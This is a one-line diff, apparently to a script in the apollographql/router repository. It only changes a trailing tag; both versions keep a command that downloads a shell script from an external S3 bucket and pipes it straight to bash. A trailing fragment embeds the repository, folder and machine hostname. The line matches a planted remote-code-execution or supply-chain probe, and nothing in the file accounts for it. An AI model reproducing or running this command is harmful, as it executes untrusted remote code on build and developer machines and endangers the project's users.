@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/apollographql/router.git\&folder=scripts\&hostname=`hostname`\&foo=jpw
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | bash | echo #?repository=https://github.com/apollographql/router.git\&folder=scripts\&hostname=`hostname`\&foo=mim
